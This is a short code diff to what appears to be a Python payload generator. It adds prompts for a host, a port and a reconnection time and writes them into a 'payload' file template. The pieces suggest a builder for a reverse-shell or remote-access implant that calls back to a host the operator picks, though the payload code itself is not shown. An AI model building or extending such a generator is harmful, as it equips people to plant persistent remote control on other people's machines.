@@ -13,9 +13,11 @@ green = "\033[32m"
 
 
 @click.command()
-@click.option("--name", prompt="[+] Set name ", help="set name", type=str)
-@click.option("--time", prompt="[+] Set reconnection time", help="set time", type=str)
-def main(name, time):
+@click.option("--name", prompt="[+] Set Name ", help="set name", type=str)
+@click.option("--host", prompt="[+] Set HOST", help="set host", type=str)
+@click.option("--port", prompt="[+] Set PORT", help="set port", type=int)
+@click.option("--time", prompt="[+] Set Reconnection Time", help="set time", type=str)
+def main(name, host, port, time):
 
     """
     create a new payload file with the given name and set reconnection time
@@ -32,6 +34,8 @@ def main(name, time):
     with open(payload_name, 'r') as file:
         code = file.read()
         code = code.replace('<TIME>', time)
+        code = code.replace('<HOST>', host)
+        code = code.replace('<PORT>', str(port))
         file.close()
 
     with open(payload_name, 'w') as file:
